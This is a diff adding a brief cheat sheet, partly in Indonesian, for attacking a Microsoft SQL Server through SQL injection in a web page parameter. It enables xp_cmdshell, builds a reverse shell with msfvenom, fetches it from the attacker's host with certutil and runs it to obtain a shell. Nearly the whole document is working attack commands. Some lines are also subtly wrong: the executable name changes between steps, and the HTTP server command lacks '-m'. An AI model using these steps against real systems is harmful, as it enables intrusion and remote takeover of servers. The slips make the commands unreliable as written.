@@ -1,0 +1,8 @@
+MsSQL server exploit
+`http://web.com/page.php?query=EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;`
+1. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.54.133 LPORT=6666 -f exe -o revsh.exe`
+2. `rlwrap ncat -lvnp 6666`
+3. `python3 http.server 8888` -- local
+4. `http://IP-target/page.php?query='; EXEC xp_cmdshell 'certutil -urlcache -f http://IP-local:8888/revsh.exe C:\Windows\Temp\revsh.exe'; --`
+5. `http://IP-target/page.php?query='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --`
+6. kembali ke listener dan akan ada shell session
